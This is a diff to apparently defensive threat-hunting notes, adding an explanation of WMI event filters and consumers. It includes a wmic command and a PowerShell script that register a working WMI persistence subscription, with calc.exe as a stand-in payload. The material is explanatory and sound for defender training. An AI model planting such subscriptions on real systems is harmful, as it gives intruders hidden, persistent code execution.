@@ -14,6 +14,9 @@
     - [Scheduled Tasks](#scheduled-tasks)
     - [DLL Hijacking](#dll-hijacking)
     - [Hunting DLL Hijacking](#hunting-dll-hijacking)
+    - [How WMI Works](#how-wmi-works)
+      - [WMI CommandLineEventConsumers](#wmi-commandlineeventconsumers)
+        - [WMI ActiveScriptEventConsumers](#wmi-activescripteventconsumers)
     - [WMI Event Consumer Backdoors](#wmi-event-consumer-backdoors)
     - [Hunting WMI Persistence](#hunting-wmi-persistence)
     - [Hunt and Analyze Persistence with Autoruns](#hunt-and-analyze-persistence-with-autoruns)
@@ -534,7 +537,76 @@ Memory Analysis
 
 This technique is often followed up C2 network beaconing
 
+### How WMI Works
 
+WMI Event Filter **“IF Statement”**
+
+* Specific **filters**, **requirements**, or **conditions** that must be met in order for the consumer to initiate.
+
+WMI Event Consumers **“THEN Statement”**
+
+* The CommandLine or ActiveScript that is executed once the initial conditions from Filtering are met.
+
+The **Filter** is the *if* statement: *"If this specific event happens..."*  
+The **Consumer** is the *then* statement: *"Then execute this action."*
+
+#### WMI CommandLineEventConsumers
+
+* More versatile since it runs single commands or chains of commands.  
+* Commonly used for reconnaissance (like running ipconfig, whoami, or net user) or triggering tools already present on the target (like net.exe, powershell.exe, or custom binaries).  
+* Simpler than ActiveScript but equally dangerous when combined with the right WMI filter.
+
+```
+wmic /namespace:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="MaliciousConsumer" CommandLineTemplate="cmd.exe /c calc.exe"
+```
+
+##### WMI ActiveScriptEventConsumers
+
+* Focused on full script execution.  
+* Scripts are typically VBScript or JScript, often stored or embedded directly in the consumer.  
+* Used for persistence or more complex tasks (e.g., downloading additional payloads, altering system configs).  
+* Artifacts like temp directories, startup folders, or unusual scripts in AppData often hint at misuse.
+
+```
+$FilterName = "MaliciousFilter"
+$ConsumerName = "MaliciousConsumer"
+$Script = "Set WshShell = CreateObject('WScript.Shell') : WshShell.Run('cmd.exe /c calc.exe')"
+
+# Define the event filter
+$Filter = ([WMIClass]"\\.\root\subscription:__EventFilter").CreateInstance()
+$Filter.Name = $FilterName
+$Filter.QueryLanguage = "WQL"
+$Filter.Query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process'"
+$Filter.Put()
+
+# Define the ActiveScript consumer
+$Consumer = ([WMIClass]"\\.\root\subscription:ActiveScriptEventConsumer").CreateInstance()
+$Consumer.Name = $ConsumerName
+$Consumer.ScriptingEngine = "VBScript"
+$Consumer.ScriptText = $Script
+$Consumer.Put()
+
+# Bind the filter to the consumer
+$Binding = ([WMIClass]"\\.\root\subscription:__FilterToConsumerBinding").CreateInstance()
+$Binding.Filter = $Filter.__PATH
+$Binding.Consumer = $Consumer.__PATH
+$Binding.Put()
+```
+
+**Filter Creation:**
+
+* The $Filter object is created from the \_\_EventFilter class.  
+* $FilterName is used as the filter's name, and a WQL query specifies what events the filter will match.
+
+**Consumer Creation:**
+
+* The $Consumer object is created from the ActiveScriptEventConsumer class.  
+* $ConsumerName is used to name the consumer.  
+* The $Script variable provides the malicious payload (e.g., running calc.exe).
+
+**Binding:**
+
+* The __FilterToConsumerBinding object binds the filter `($Filter)` to the consumer `($Consumer)` using their paths.
 
 ### WMI Event Consumer Backdoors
 - Allows triggers to be set that will run scripts and executables
